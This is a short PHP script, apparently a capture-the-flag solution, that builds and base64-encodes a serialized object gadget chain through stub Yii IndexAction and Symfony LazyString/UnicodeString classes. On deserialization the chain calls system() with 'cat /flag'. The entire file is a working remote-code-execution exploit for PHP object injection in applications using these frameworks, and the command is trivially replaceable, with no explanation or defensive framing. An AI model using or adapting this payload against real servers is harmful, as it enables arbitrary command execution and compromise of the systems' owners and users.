<?php
/*

*/
namespace yii\base {
	class Action
	{
		public $id;
	}
}

namespace yii\rest {
	class Action extends \yii\base\Action
	{
		public $checkAccess;

	}

	class IndexAction extends Action
	{
		public function __construct($func, $param)
		{
			$this->checkAccess = $func;
			$this->id = $param;
		}
	}
}

namespace Symfony\Component\String {
	class LazyString
	{
		private $value;

		public function __construct($func, $param)
		{
			$this->value = [new \yii\rest\IndexAction($func, $param), "run"];
		}
	}

	abstract class AbstractString
	{
		protected $string = '';
	}

	class UnicodeString extends AbstractString
	{
		public function __construct($func, $param)
		{
			$this->string = new LazyString($func, $param);
		}
	}
}

namespace {
	$a = new Symfony\Component\String\UnicodeString("system", "cat /flag");
	echo base64_encode(serialize($a));
}